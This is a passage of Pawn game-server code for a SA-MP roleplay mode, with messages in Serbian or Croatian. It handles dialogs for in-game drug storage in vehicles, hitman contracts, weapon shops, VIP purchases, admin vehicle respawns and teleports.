	       	if( kolicina < 1 || kolicina > 5000 ) return SendErrorMessage( playerid, "Ne mozete ispod 1 i preko 5000g odjednom.");
	       	if( PlayerInfo[playerid][xTorba_Droga] < kolicina ) return SendErrorMessage( playerid, "Nemate toliko droge u torbi.");

			if( (PlayerInfo[playerid][xTorba_Droga]+kolicina) < 100000 )
			{
				VehicleInfo[ izbor ][ vDrugAmmount ] += kolicina;
				PlayerInfo[playerid][xTorba_Droga] -= kolicina;
				sql_user_update_integer(playerid, "xTorba_Droga", PlayerInfo[playerid][xTorba_Droga]);

				SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "* %s uzima nesto iz gepeka.", ImeIgraca( playerid ) );
				SCMF( playerid, 0xFFFF00FF, "(VOZILO): Ostavili ste {FFFFFF}(%dg) {FFFF00}droge u gepek.", kolicina );

				new q[ 128 ];
				mysql_format( mSQL, q, sizeof(q), "UPDATE `vehicles` SET `v_drug_ammount` = '%d' WHERE `veh_id` = '%d' LIMIT 1", VehicleInfo[ izbor ][ vDrugAmmount ], VehicleInfo[ izbor ][ vSqlID ] );
				mysql_tquery( mSQL, q );
			}
			else SendErrorMessage( playerid, "Nemate vise mesta da stavite drogu." );
		}
	}
	else if(dialogid == dialog_VEHICLETAKEDRUG )
	{
	    if( !response ) return 1;
		if( response )
		{
		    new kolicina,
				izbor = ChosenVehicle[ playerid ];

		    if( sscanf( inputtext, "d", kolicina ) ) return ShowPlayerDialog( playerid, dialog_VEHICLETAKEDRUG, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite kolicinu droge za uzimanje.", "Potvrdi", "Odustani" );

			if( VehicleInfo[ izbor ][ vDrugAmmount ] == 0 ) return SendErrorMessage( playerid, "Ovo vozilo nema drogu!");
	       	if( kolicina < 1 || kolicina > VehicleInfo[ izbor ][ vDrugAmmount ] ) return SendErrorMessage( playerid, "Ovo vozilo nema toliko droge!");

			VehicleInfo[ izbor ][ vDrugAmmount ] -= kolicina;
			PlayerInfo[playerid][xTorba_Droga] += kolicina;
			sql_user_update_integer(playerid, "xTorba_Droga", PlayerInfo[playerid][xTorba_Droga]);

			SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "* %s uzima nesto iz gepeka.", ImeIgraca( playerid ) );
			SCMF( playerid, 0xFFFF00FF, "(VOZILO): Uzeli ste {FFFFFF}(%dg) {FFFF00}droge iz gepeka.", kolicina );

			new q[ 128 ];
			mysql_format( mSQL, q, sizeof(q), "UPDATE `vehicles` SET `v_drug_ammount` = '%d' WHERE `veh_id` = '%d' LIMIT 1", VehicleInfo[ izbor ][ vDrugAmmount ], VehicleInfo[ izbor ][ vSqlID ] );
			mysql_tquery( mSQL, q );
		}
	}
	else if(dialogid == dialog_PORTABLE )
	{
	    if( !response ) return 1;
		if( response )
		{
		    switch( listitem )
			{
		        case 0:
				{
		            if( PlayerInfo[ playerid ][ xRank ] < 4 ) return SendErrorMessage( playerid, "Samo Rank 4 agencije ili preko moze da dodjeli mete." );
				    SearchingHit( playerid );
		        }
		        case 1:
				{
		            if( PlayerInfo[ playerid ][ xRank ] < 4 ) return SendErrorMessage( playerid, "Samo Rank 4 agencije ili preko moze da dodjeli mete." );
				    if( hitfound == 0 ) return SendErrorMessage( playerid, "Trenutno nema pronadjenih meta, kucajte [ /portable ] da vidite dostupne mete.");
					ShowPlayerDialog( playerid, dialog_GIVEHIT, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite ID ubojice kojem dajete metu:", "Potvrdi", "Odustani" );
				}
				case 2:
				{
				    new string[ 64 ], OrgID = PlayerInfo[ playerid ][ xClan ];
					foreach( new i : Player)
					{
                        if( PlayerLogged[ i ] == true && PlayerInfo[ i ][ xClan ] == OrgID )
						{
						    format( string, sizeof( string ), "* %s: Rank %d", ImeIgraca( i ), PlayerInfo[ i ][ xRank ] );
							SendClientMessage( playerid, SIVA, string );
						}
					}
				}
				case 3:
				{
    				ShowPlayerDialog( playerid, dialog_HORDER, DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Dostupni paketi:",
																														"{FFFFFF}Paket ID\t{FFFFFF}Cijena\t{FFFFFF}Rank\n\
																														{4282C0}(1). {FFFFFF}Paket 1\t$200\t1+\n\
																														{4282C0}(2). {FFFFFF}Paket 2\t$300\t2+\n\
																														{4282C0}(3). {FFFFFF}Paket 3\t$500\t3+\n\
																														{4282C0}(4). {FFFFFF}Paket 4\t$750\t4+\n\
																														{4282C0}(5). {FFFFFF}Paket 5\t$1000\t5+", "Potvrdi", "Odustani" );
				}
			}
		}
	}
	else if(dialogid == dialog_GIVEHIT )
	{
	    if( !response ) return 1;
		if( response )
		{
		    new id;
            if( sscanf( inputtext, "u", id ) ) return SendErrorMessage( playerid, "Krivi ID." );
	        if( id == IPI ) return SendErrorMessage( playerid, "Krivi ID." );
	        if( org_info[ PlayerInfo[ id ][ xClan ] ][ oTip ] != ORG_TIP_HITMAN ) return SendErrorMessage( playerid, "Taj igrac nije clan agencije.");
			if( HitmanInfo[ id ][ GoChase ] < 999 ) return SendErrorMessage( playerid, "Taj clan ima vec dodjeljenu metu.");
			if( PlayerInfo[ ahitid ][ xHitmenCena ] == 0 ) return SendErrorMessage( playerid, "Prvo moras da vidis kontrakte." );
			if( IsPlayerConnected( ahitid ) )
			{
                for( new a = 1; a < MAX_ORG; a++)
				{
		    		if( org_info[ a ][ oTip ] == ORG_TIP_HITMAN )
					{ 
                   		OrgPoruka( a, ZUTA, "* Hitman %s je dodelio ubojici %s-u da ubije %s(%d) za ($%d).", ImeIgraca( playerid ), ImeIgraca( id ), ImeIgraca( ahitid ), ahitid, PlayerInfo[ ahitid ][ xHitmenCena ] );
					}
				}
				HitmanInfo[ id ][ GoChase ] = ahitid;
		   		HitmanInfo[ ahitid ][ GetChased ] = id;
		   		HitmanInfo[ ahitid ][ GotHit ] = 1;
		   		ahitid = 0;
		   		hitfound = 0;
			}
			else return SendErrorMessage( playerid, "Meta je trenutno offline, potrazite nove.");
		}
	}
	else if(dialogid == dialog_HORDER )
	{
	    if( !response ) return 1;
		if( response )
		{
		    switch( listitem )
			{
		    	case 0:
				{
		    	    if( PlayerInfo[ playerid ][ xRank ] < 1 ) return SendErrorMessage( playerid, "Da bi porucili zeljeni paket morate imati visi rank!" );
			        if( PlayerInfo[ playerid ][ xNovac ] > 200 )
					{
			        	SendClientMessage( playerid, 0xFFFF00FF, "(HITMAN): Narucili ste paket, cena ovog paketa je 200$, paket je bacen iz helikoptera i sada se nalazi kod vas." );
				        GiveWeaponToPlayer( playerid, 24, 50 );
						GiveWeaponToPlayer( playerid, 29, 500 );
						GiveWeaponToPlayer( playerid, 25, 100 );
						GiveWeaponToPlayer( playerid, 4, 1 );
			            DajIgracuNovac( playerid, -200 );
			        }
			        else return SendErrorMessage( playerid, "Nemate dovoljno novca za odabrani paket!");
				}
				case 1:
				{
		    	    if( PlayerInfo[ playerid ][ xRank ] < 2 ) return SendErrorMessage( playerid, "Da bi porucili zeljeni paket morate imati visi rank!" );
			        if( PlayerInfo[ playerid ][ xNovac ] > 300 )
					{
			        	SendClientMessage( playerid, 0xFFFF00FF, "(HITMAN): Narucili ste paket, cena ovog paketa je 300$, paket je bacen iz helikoptera i sada se nalazi kod vas." );
				        GiveWeaponToPlayer( playerid, 24, 50 );
						GiveWeaponToPlayer( playerid, 29, 500 );
						GiveWeaponToPlayer( playerid, 25, 50 );
						GiveWeaponToPlayer( playerid, 31, 500 );
						GiveWeaponToPlayer( playerid, 4, 1 );
			            DajIgracuNovac( playerid, -300 );
			        }
			        else return SendErrorMessage( playerid, "Nemate dovoljno novca za odabrani paket!");
				}
				case 2:
				{
		    	    if( PlayerInfo[ playerid ][ xRank ] < 3 ) return SendErrorMessage( playerid, "Da bi porucili zeljeni paket morate imati visi rank!" );
			        if( PlayerInfo[ playerid ][ xNovac ] > 500 )
					{
			        	SendClientMessage( playerid, 0xFFFF00FF, "(HITMAN): Narucili ste paket, cena ovog paketa je 500$, paket je bacen iz helikoptera i sada se nalazi kod vas." );
				        GiveWeaponToPlayer( playerid, 24, 50 );
						GiveWeaponToPlayer( playerid, 29, 500 );
						GiveWeaponToPlayer( playerid, 25, 50 );
						GiveWeaponToPlayer( playerid, 30, 500 );
						GiveWeaponToPlayer( playerid, 4, 1 );
			            DajIgracuNovac( playerid, -500 );
			        }
			        else return SendErrorMessage( playerid, "Nemate dovoljno novca za odabrani paket!");
				}
				case 3:
				{
		    	    if( PlayerInfo[ playerid ][ xRank ] < 4 ) return SendErrorMessage( playerid, "Da bi porucili zeljeni paket morate imati visi rank!" );
			        if( PlayerInfo[ playerid ][ xNovac ] > 750 )
					{
			        	SendClientMessage( playerid, 0xFFFF00FF, "(HITMAN): Narucili ste paket, cena ovog paketa je 750$, paket je bacen iz helikoptera i sada se nalazi kod vas." );
				        GiveWeaponToPlayer( playerid, 24, 50 );
						GiveWeaponToPlayer( playerid, 29, 500 );
						GiveWeaponToPlayer( playerid, 25, 50 );
						GiveWeaponToPlayer( playerid, 31, 500 );
						GiveWeaponToPlayer( playerid, 4, 1 );
						GiveWeaponToPlayer( playerid, 34, 20 );
			            DajIgracuNovac( playerid, -750 );
			        }
			        else return SendErrorMessage( playerid, "Nemate dovoljno novca za odabrani paket!");
				}
				case 4:
				{
		    	    if( PlayerInfo[ playerid ][ xRank ] < 5 ) return SendErrorMessage( playerid, "Da bi porucili zeljeni paket morate imati visi rank!" );
			        if( PlayerInfo[ playerid ][ xNovac ] > 1000 )
					{
			        	SendClientMessage( playerid, 0xFFFF00FF, "(HITMAN): Narucili ste paket, cena ovog paketa je 1000$, paket je bacen iz helikoptera i sada se nalazi kod vas." );
				        GiveWeaponToPlayer( playerid, 24, 50 );
						GiveWeaponToPlayer( playerid, 29, 500 );
						GiveWeaponToPlayer( playerid, 25, 50 );
						GiveWeaponToPlayer( playerid, 30, 500 );
						GiveWeaponToPlayer( playerid, 4, 1 );
						GiveWeaponToPlayer( playerid, 34, 20 );
			            DajIgracuNovac( playerid, -1000 );
			        }
			        else return SendErrorMessage( playerid, "Nemate dovoljno novca za odabrani paket!");
				}
		    }
		}
	}
	else if(dialogid == dialog_RESETIRAJ )
	{
	    if( !response ) return 1;
		if( response )
		{
		    switch( listitem )
			{
		    	case 0:
				{
		    	    if( ServerInfo[ RRVehicle ] == true ) return SendErrorMessage( playerid, "Vec je pokrenut jedan RAC." );
		            if( PlayerInfo[ playerid ][ xAdmin ] < 3 || PlayerInfo[ playerid ][ xAdmin ] < 4 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu(3+)." );

		            SetTimerEx_("VehiclePrivateRespawn", 13000, 13000, 1, "ii", 0, 1);
	        		ServerInfo[ RRVehicle ] = true;

		            SendClientMessageToAllEx( 0x41BAB4FF, "(RESPAWN): Admin {FFFFFF}%s {41BAB4}je aktivirao respawn praznih osobnih vozila.", ImeIgraca( playerid ) );
		            SendClientMessageToAll( 0x41BAB4FF, "(RESPAWN): Respawn ce biti pokrenut za {FFFFFF}(15) {41BAB4}sekundi." );
		    	}
				case 1:
				{
		    	    if( ServerInfo[ RRVehicle ] == true ) return SendErrorMessage( playerid, "Vec je pokrenut jedan RAC." );
                    if( PlayerInfo[ playerid ][ xAdmin ] < 3 || PlayerInfo[ playerid ][ xAdmin ] < 4) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu(3+)." );

		            SetTimerEx_("VehicleOrgRespawn", 13000, 13000, 1, "ii", 0, 1);
					ServerInfo[ RRVehicle ] = true;

		            SendClientMessageToAllEx( 0x41BAB4FF, "(RESPAWN): Admin {FFFFFF}%s {41BAB4}je aktivirao respawn praznih organizacijskih vozila.", ImeIgraca( playerid ) );
		            SendClientMessageToAll( 0x41BAB4FF, "(RESPAWN): Respawn ce biti pokrenut za {FFFFFF}(15) {41BAB4}sekundi." );
		    	}
		    	case 2:
				{
		    	    if( ServerInfo[ RRVehicle ] == true ) return SendErrorMessage( playerid, "Vec je pokrenut jedan RAC." );
                    if( PlayerInfo[ playerid ][ xAdmin ] < 1 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );

		            SetTimerEx_("VehicleRespawn", 13000, 13000, 1, "ii", 0, 1);
	        		ServerInfo[ RRVehicle ] = true;

		            SendClientMessageToAllEx( 0x41BAB4FF, "(RESPAWN): %s {FFFFFF}%s {41BAB4}je aktivirao respawn svih vozila.", getAdminRankName( playerid ), ImeIgraca( playerid ) );
		            SendClientMessageToAll( 0x41BAB4FF, "(RESPAWN): Respawn ce biti pokrenut za {FFFFFF}(15) {41BAB4}sekundi." );
		    	}
		    	case 3:
				{
		    	    if( ServerInfo[ RRVehicle ] == true ) return SendErrorMessage( playerid, "Vec je pokrenut jedan RAC." );
		    	    if( PlayerInfo[ playerid ][ xAdmin ] < 3 || PlayerInfo[ playerid ][ xAdmin ] < 4 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu(3+)." );
		    	    for( new i = 0; i <= GetVehiclePoolSize(); i++ )
					{
						if( IsValidVehicle( i ) && IsVehiclePrikolica( i ) )
						{
							SetVehicleToRespawn( i );
						}
					}

		            DodajWarnRed("~y~(RESPAWN): ~w~Admin ~y~%s ~w~je respawna%s sve cisterne.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
		    	}
			}
		}
	}
	else if(dialogid == dialog_ZPOENI )
	{
	    if( !response ) return 1;
		if( response )
		{
		    new ZPoen;
		    switch( listitem )
			{
		        case 0:
				{
		            ZPoen = 15;
		         	if( PlayerInfo[ playerid ][ xUPoen ] < ZPoen ) return SendErrorMessage( playerid, "Nemate dovoljno U-Poena." );
		        	PlayerInfo[ playerid ][ xVIPLevel ] = 1;
		        	PlayerInfo[ playerid ][ xVipTime ] = gettime();
		        	PlayerInfo[ playerid ][ xUPoen ] -= ZPoen;

		        	new q[ 128 ];
					mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `vip_level` = '%d', `vip_time` = '%f', `xUPoen` = '%d' WHERE `user_id` = '%d'", PlayerInfo[ playerid ][ xVIPLevel ], PlayerInfo[ playerid ][ xVipTime ], PlayerInfo[ playerid ][ xUPoen ], PlayerInfo[ playerid ][ xID ] );
			    	mysql_tquery( mSQL, q );

		        	SendClientMessage( playerid, 0xFF6347FF, "(U-POEN): Uzeli ste paket - {FFFFFF}'VIP level 1'.");
					SCMF( playerid, 0xFF6347FF, "(U-POEN): Iskoristili ste {FFFFFF}(%d) {FF6347}UP Poena imate jos {FFFFFF}(%d) {FF6347}U-Poena.", ZPoen, PlayerInfo[ playerid ][ xUPoen ] );

					WriteLog("log-poeni", "Igrac %s je aktivirao VIP level 1 U-Poenima", ImeIgraca( playerid ));
				}
		        case 1:
				{
		            ZPoen = 20;
		         	if( PlayerInfo[ playerid ][ xUPoen ] < ZPoen ) return SendErrorMessage( playerid, "Nemate dovoljno U-Poena." );
		        	PlayerInfo[ playerid ][ xVIPLevel ] = 2;
		        	PlayerInfo[ playerid ][ xVipTime ] = gettime();
		        	PlayerInfo[ playerid ][ xUPoen ] -= ZPoen;

		        	new q[ 128 ];
					mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `vip_level` = '%d', `vip_time` = '%f', `xUPoen` = '%d' WHERE `user_id` = '%d'", PlayerInfo[ playerid ][ xVIPLevel ], PlayerInfo[ playerid ][ xVipTime ], PlayerInfo[ playerid ][ xUPoen ], PlayerInfo[ playerid ][ xID ] );
			    	mysql_tquery( mSQL, q );

		        	SendClientMessage( playerid, 0xFF6347FF, "(U-POEN): Uzeli ste paket - {FFFFFF}'VIP level 2'.");
					SCMF( playerid, 0xFF6347FF, "(U-POEN): Iskoristili ste {FFFFFF}(%d) {FF6347}U-Poena imate jos {FFFFFF}(%d) {FF6347}U-Poena.", ZPoen, PlayerInfo[ playerid ][ xUPoen ] );

					WriteLog("log-poeni", "Igrac %s je aktivirao VIP level 2 U-Poenima", ImeIgraca( playerid ));
		        }
		        case 2:
				{
		            ZPoen = 25;
		         	if( PlayerInfo[ playerid ][ xUPoen ] < ZPoen ) return SendErrorMessage( playerid, "Nemate dovoljno U-Poena." );
		        	PlayerInfo[ playerid ][ xVIPLevel ] = 3;
		        	PlayerInfo[ playerid ][ xVipTime ] = gettime();
		        	PlayerInfo[ playerid ][ xUPoen ] -= ZPoen;

		        	new q[ 128 ];
					mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `vip_level` = '%d', `vip_time` = '%f', `xUPoen` = '%d' WHERE `user_id` = '%d'", PlayerInfo[ playerid ][ xVIPLevel ], PlayerInfo[ playerid ][ xVipTime ], PlayerInfo[ playerid ][ xUPoen ], PlayerInfo[ playerid ][ xID ] );
			    	mysql_tquery( mSQL, q );

		        	SendClientMessage( playerid, 0xFF6347FF, "(U-POEN): Uzeli ste paket - {FFFFFF}'VIP level 3'.");
					SCMF( playerid, 0xFF6347FF, "(U-POEN): Iskoristili ste {FFFFFF}(%d) {FF6347}U-Poena imate jos {FFFFFF}(%d) {FF6347}U-Poena.", ZPoen, PlayerInfo[ playerid ][ xUPoen ] );

					WriteLog("log-poeni", "Igrac %s je aktivirao VIP level 3 U-Poenima", ImeIgraca( playerid ));
			    }
		        case 3:
				{
		            ZPoen = 10;
		         	if( PlayerInfo[ playerid ][ xUPoen ] < ZPoen ) return SendErrorMessage( playerid, "Nemate dovoljno U-Poena." );
		        	PlayerInfo[ playerid ][ xLevel ]++;
		        	SetPlayerScore( playerid, PlayerInfo[ playerid ][ xLevel ] );
		        	PlayerInfo[ playerid ][ xUPoen ] -= ZPoen;

		        	new q[ 128 ];
					mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `level` = '%d', `xUPoen` = '%d' WHERE `user_id` = '%d'", PlayerInfo[ playerid ][ xLevel ], PlayerInfo[ playerid ][ xUPoen ], PlayerInfo[ playerid ][ xID ] );
			    	mysql_tquery( mSQL, q );

		        	SendClientMessage( playerid, 0xFF6347FF, "(U-POEN): Uzeli ste paket - {FFFFFF}'Level UP'.");
					SCMF( playerid, 0xFF6347FF, "(U-POEN): Iskoristili ste {FFFFFF}(%d) {FF6347}U-Poena imate jos {FFFFFF}(%d) {FF6347}U-Poena.", ZPoen, PlayerInfo[ playerid ][ xUPoen ] );

					WriteLog("log-poeni", "Igrac %s je aktivirao levelup U-Poenima", ImeIgraca( playerid ));
			    }
		    }
		}
	}
	else if(dialogid == dialog_SELECTVGUN )
	{
	    if( !response ) return 1;
		if( response )
		{
		    switch( listitem )
			{
			    case 0:
				{
			        if( PlayerInfo[ playerid ][ xNovac ] < 9500 ) return SendErrorMessage( playerid, "Nemate dovoljno novca 9.500$");

					DajIgracuNovac( playerid, -9500 );
					GiveWeaponToPlayer( playerid, 25, 50 );
					SendInfoMessage( playerid, "Kupili ste Shotgun sa 50 metaka za 9.500$" );
			    }
			    case 1:
				{
			        if( PlayerInfo[ playerid ][ xNovac ] < 1000 ) return SendErrorMessage( playerid, "Nemate dovoljno novca 1.000$");

					DajIgracuNovac( playerid, -1000 );
					GiveWeaponToPlayer( playerid, 5, 1 );
					SendInfoMessage( playerid, "Kupili ste palicu za 1.000$" );
			    }
			    case 2:
				{
			        if( PlayerInfo[ playerid ][ xNovac ] < 1000 ) return SendErrorMessage( playerid, "Nemate dovoljno novca 1.000$");

					DajIgracuNovac( playerid, -1000 );
					GiveWeaponToPlayer( playerid, 14, 1 );
					SendInfoMessage( playerid, "Kupili ste cvece za 1.000$" );
			    }
			    case 3:
				{
			        if( PlayerInfo[ playerid ][ xVIPLevel ] < 2 ) return SendErrorMessage( playerid, "Ovo oruzje moze da kupi samo VIP Level 2+." );
			        if( PlayerInfo[ playerid ][ xNovac ] < 7000 ) return SendErrorMessage( playerid, "Nemate dovoljno novca 7.000$");

					DajIgracuNovac( playerid, -7000 );
					GiveWeaponToPlayer( playerid, 24, 50 );
					SendInfoMessage( playerid, "Kupili ste deagle sa 50 metaka za 7.000$" );
			    }
			    case 4:
				{
			        if( PlayerInfo[ playerid ][ xVIPLevel ] < 2 ) return SendErrorMessage( playerid, "Ovo oruzje moze da kupi samo VIP Level 2+." );
			        if( PlayerInfo[ playerid ][ xNovac ] < 4000 ) return SendErrorMessage( playerid, "Nemate dovoljno novca 4.000$");

					DajIgracuNovac( playerid, -4000 );
					GiveWeaponToPlayer( playerid, 22, 100 );
					SendInfoMessage( playerid, "Kupili ste Pistol 9mm sa 100 metaka za 4.000$" );
			    }
			    case 5:
				{
			        if( PlayerInfo[ playerid ][ xVIPLevel ] < 3 ) return SendErrorMessage( playerid, "Ovo oruzje moze da kupi samo VIP Level 3+." );
			        if( PlayerInfo[ playerid ][ xNovac ] < 9000 ) return SendErrorMessage( playerid, "Nemate dovoljno novca 9.000$");

					DajIgracuNovac( playerid, -9000 );
					GiveWeaponToPlayer( playerid, 28, 150 );
					SendInfoMessage( playerid, "Kupili ste Uzi sa 150 metaka za 9.000$" );
			    }
			    case 6:
				{
			        if( PlayerInfo[ playerid ][ xVIPLevel ] < 3 ) return SendErrorMessage( playerid, "Ovo oruzje moze da kupi samo VIP Level 3+." );
			        if( PlayerInfo[ playerid ][ xNovac ] < 9500 ) return SendErrorMessage( playerid, "Nemate dovoljno novca 9.500$");

					DajIgracuNovac( playerid, -9500 );
					GiveWeaponToPlayer( playerid, 29, 150 );
					SendInfoMessage( playerid, "Kupili ste MP5 sa 150 metaka za 9.500$" );
			    }
			    case 7:
				{
			        if( PlayerInfo[ playerid ][ xVIPLevel ] < 4 ) return SendErrorMessage( playerid, "Ovo oruzje moze da kupi samo VIP Level 4+." );
			        if( PlayerInfo[ playerid ][ xNovac ] < 11000 ) return SendErrorMessage( playerid, "Nemate dovoljno novca 11.000$");

					DajIgracuNovac( playerid, -11000 );
					GiveWeaponToPlayer( playerid, 31, 200 );
					SendInfoMessage( playerid, "Kupili ste M16 sa 200 metaka za 11.000$" );
			    }
			    case 8:
				{
			        if( PlayerInfo[ playerid ][ xVIPLevel ] < 4 ) return SendErrorMessage( playerid, "Ovo oruzje moze da kupi samo VIP Level 4+." );
			        if( PlayerInfo[ playerid ][ xNovac ] < 11500 ) return SendErrorMessage( playerid, "Nemate dovoljno novca 11.500$");

					DajIgracuNovac( playerid, -11500 );
					GiveWeaponToPlayer( playerid, 30, 200 );
					SendInfoMessage( playerid, "Kupili ste AK47 sa 200 metaka za 11.500$" );
			    }
			    case 9:
				{
			        if( PlayerInfo[ playerid ][ xVIPLevel ] < 5 ) return SendErrorMessage( playerid, "Pancir moze da kupi samo VIP Level 5+." );
			        if( PlayerInfo[ playerid ][ xNovac ] < 12000 ) return SendErrorMessage( playerid, "Nemate dovoljno novca 12.000$");

					DajIgracuNovac( playerid, -12000 );
					SetPlayerArmour( playerid, 100 );
					SendInfoMessage( playerid, "Kupili ste pancir za 10.000$" );
			    }
			    case 10:
				{
			        if( PlayerInfo[ playerid ][ xVIPLevel ] < 5 ) return SendErrorMessage( playerid, "Ovo oruzje moze da kupi samo VIP Level 5+." );
			        if( PlayerInfo[ playerid ][ xNovac ] < 20000 ) return SendErrorMessage( playerid, "Nemate dovoljno novca 20.000$");

					DajIgracuNovac( playerid, -20000 );
					GiveWeaponToPlayer( playerid, 34, 30 );
					SendInfoMessage( playerid, "Kupili ste Sniper sa 10 metaka za 20.000$" );
			    }
			}
		}
	}
	else if(dialogid == dialog_TELEPORTS )
	{
	    if( !response ) return 1;
		if( response )
		{
	        switch( listitem )
			{
	            case 0:
				{
					DialogStrgEx[0] = EOS;

					for(new i; i < MAX_PORTS; i++)
					{
						format(DialogStrgEx, sizeof(DialogStrgEx), "%s{4282C0}(%d). {FFFFFF}%s\n", DialogStrgEx, i+1, portInfo[i][tpNaziv]);
					}

					ShowPlayerDialog( playerid, dialog_ports_MAIN, DIALOG_STYLE_INPUT, "{FFFFFF}Izaberi lokaciju:", DialogStrgEx, "Port", "Odustani");

					DialogStrgEx[0] = EOS;
	            }
	            case 1:
				{
	                strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );

				    for( new i = 0; i < MAX_JOBS; i++ )
					{
				        format( DialogStrgEx, sizeof( DialogStrgEx ), "%s{4282C0}(%d). {FFFFFF}%s\n", DialogStrgEx, i+1, jobsInfos[ i ][ jName ] );
					}

					ShowPlayerDialog( playerid, dialog_ports_JOBS, DIALOG_STYLE_LIST, "{FFFFFF}Izaberi posao:", DialogStrgEx, "Port", "Odustani" );
				    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );

	            }
	            case 2:
				{
	                strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
                	for( new i = 1; i < MAX_ORG; i++ )
					{
						if( org_info[ i ][ oID ] > 0 )
						{
				  			format( DialogStrgEx, sizeof( DialogStrgEx ), "%s{4282C0}(%d). {FFFFFF}%s\n", DialogStrgEx, i, org_info[ i ][ oName ] );
						}
					}
					ShowPlayerDialog( playerid, dialog_ports_ORGS, DIALOG_STYLE_LIST, "{FFFFFF}Izaberi organizaciju:", DialogStrgEx, "Port", "Odustani" );
				    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
	            }
	            case 3:
	            {
					ShowPlayerDialog( playerid, dialog_ports_MISSIONS, DIALOG_STYLE_LIST, "{FFFFFF}Izaberi misiju:", "Uskoro nove misije...", "Port", "Odustani" );	            	
	            }
	        }
		}
	}
	else if(dialogid == dialog_ports_MISSIONS)
	{
		if(!response) return 1;
		if(response)
		{
			switch(listitem) 
			{
				case 0:
				{
					/*UcitajObjekte(playerid);
					SMG_SetPlayerPos(playerid, 1421.3903, -1327.2521, 13.5599);
					SetPlayerInterior(playerid, 0);
					SetPlayerVirtualWorld(playerid, 0);
					SCMF(playerid, 0x4282C0FF, "(TP): Teleportovali ste se do lokacije {FFFFFF}Misija Transport.");*/
				}
			}
		}
	}
	else if(dialogid == dialog_ports_MAIN )
	{
	    if( !response ) return 1;
		if( response )
		{
		    new bool:ima_dozvolu = false, id = strval(inputtext)-1;
			if(id < 0 || id > MAX_PORTS-1) return SendErrorMessage(playerid, "ID porta ne moze biti manji od 1 ili veci od %d.", MAX_PORTS);
		    if(PlayerInfo[playerid][xAdmin] != 0 || PlayerInfo[playerid][xSpecAdmin] != 0 || PlayerInfo[playerid][xGamemaster] != 0) ima_dozvolu = true;
		    if(portInfo[id][tpVIP] <= PlayerInfo[playerid][xVIPLevel]) ima_dozvolu = true;
		    if(portInfo[id][tpPromoter] <= PlayerInfo[playerid][xPromoter]) ima_dozvolu = true;
		    if(portInfo[id][tpYouTuber] <= PlayerInfo[playerid][xYouTuber]) ima_dozvolu = true;

			if(!ima_dozvolu) return SendErrorMessage(playerid, "Ne mozete se portati na ovu lokaciju, niste ovlasceni.");

			UcitajObjekte(playerid);
            new tmpcar = GetPlayerVehicleID( playerid );
			if( GetPlayerState( playerid ) == 2 )
			{
		 		SMG_SetVehiclePos( tmpcar, portInfo[ id ][ tpPosX ], portInfo[ id ][ tpPosY ], portInfo[ id ][ tpPosZ ] );
		 	}
			else
			{
				SMG_SetPlayerPos( playerid, portInfo[ id ][ tpPosX ], portInfo[ id ][ tpPosY ], portInfo[ id ][ tpPosZ ] );
			}

			SetPlayerInterior( playerid, 0 );
			SetPlayerVirtualWorld( playerid, 0 );

            if(PlayerInfo[playerid][xAdmin] != 0)
			{ 
				DodajWarnRed("~y~(PORT) ~w~Admin ~y~%s ~w~se teleportova%s do ~y~%s.", ImeIgraca(playerid), getPolForString(playerid, "o", "la"), portInfo[id][tpNaziv] );
			}
			else if(PlayerInfo[playerid][xSpecAdmin] != 0)
			{ 
				DodajWarnRed("~y~(PORT) ~w~Spec Admin ~y~%s ~w~se teleportova%s do ~y~%s.", ImeIgraca(playerid), getPolForString(playerid, "o", "la"), portInfo[id][tpNaziv] );
			}
            else if(PlayerInfo[playerid][xGamemaster] != 0)
			{ 
				DodajWarnRed("~y~(PORT) ~w~Gamemaster ~y~%s ~w~se teleportova%s do ~y~%s.", ImeIgraca(playerid), getPolForString(playerid, "o", "la"), portInfo[id][tpNaziv] );
			}
			else if(PlayerInfo[playerid][xVIPLevel] != 0)
			{ 
				DodajWarnRed("~y~(PORT) ~w~VIP ~y~%s ~w~se teleportova%s do ~y~%s.", ImeIgraca(playerid), getPolForString(playerid, "o", "la"), portInfo[id][tpNaziv]);

				if(PlayerInfo[playerid][xVIPLevel] != 6) CooldownPort[ playerid ] = gettime()+60;
			}
			else if(PlayerInfo[playerid][xPromoter] != 0)
			{ 
				DodajWarnRed("~y~(PORT) ~w~Promoter ~y~%s ~w~se teleportova%s do ~y~%s.", ImeIgraca(playerid), getPolForString(playerid, "o", "la"), portInfo[id][tpNaziv] );

				if(PlayerInfo[playerid][xPromoter] < 3) CooldownPort[ playerid ] = gettime()+60;
			}
			else if(PlayerInfo[playerid][xYouTuber] != 0)
			{ 
				DodajWarnRed("~y~(PORT) ~w~YouTuber ~y~%s ~w~se teleportova%s do ~y~%s.", ImeIgraca(playerid), getPolForString(playerid, "o", "la"), portInfo[id][tpNaziv] );

				if(PlayerInfo[playerid][xYouTuber] < 2) CooldownPort[ playerid ] = gettime()+60;
			}
			SCMF(playerid, 0x4282C0FF, "(TP): Teleportovali ste se do lokacije {FFFFFF}%s.", portInfo[ id ][ tpNaziv ] );
		}
	}
	else if(dialogid == dialog_ports_JOBS )
	{
	    if( !response ) return 1;
		if( response )
		{
			UcitajObjekte(playerid);
		    new tmpcar = GetPlayerVehicleID( playerid );
			if( GetPlayerState( playerid ) == 2 )
			{
		 		SMG_SetVehiclePos( tmpcar, jobsInfos[ listitem ][ jPos ][ 0 ], jobsInfos[ listitem ][ jPos ][ 1 ], jobsInfos[ listitem ][ jPos ][ 2 ] );
		 	}
			else
			{
